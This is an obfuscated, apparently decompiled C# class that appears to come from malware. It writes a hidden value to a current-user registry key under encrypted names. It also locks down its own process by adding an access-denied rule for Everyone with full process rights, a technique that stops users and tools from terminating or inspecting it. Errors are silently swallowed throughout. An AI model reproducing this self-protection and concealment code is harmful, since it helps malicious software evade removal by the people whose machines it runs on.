using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

internal sealed class kBiTNTEZalKoktNo
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr hVBeQToutfnHrLH, int ieYTVxrrBGr, [Out] byte[] XdaBhstchXU, uint SqXqDITqQe, out uint LNEmplwJSjgzBi);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr OwcJOoPFCidtY, int pQQUkGWssnG, [In] byte[] bxmypCOywse);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void bRhLbapXWtWCpW(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(UzNyTypkvLt.VzYMPTFsHuw(UzNyTypkvLt.tQZMOZqkYus(getString_0(107399027))));
			registryKey.SetValue(UzNyTypkvLt.VzYMPTFsHuw(getString_0(107398954)), getString_0(107400090));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor kVLhbHFwmll(IntPtr intptr_0)
	{
		byte[] xdaBhstchXU = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, xdaBhstchXU, 0u, out var LNEmplwJSjgzBi);
		if ((long)LNEmplwJSjgzBi > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, xdaBhstchXU = new byte[LNEmplwJSjgzBi], LNEmplwJSjgzBi, out LNEmplwJSjgzBi))
		{
			return null;
		}
		return new RawSecurityDescriptor(xdaBhstchXU, 0);
	}

	private void BTIQsxBKptWbzVNl(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void hQFKzthHyuG()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = kVLhbHFwmll(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			BTIQsxBKptWbzVNl(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static kBiTNTEZalKoktNo()
	{
		Strings.CreateGetStringDelegate(typeof(kBiTNTEZalKoktNo));
	}
}
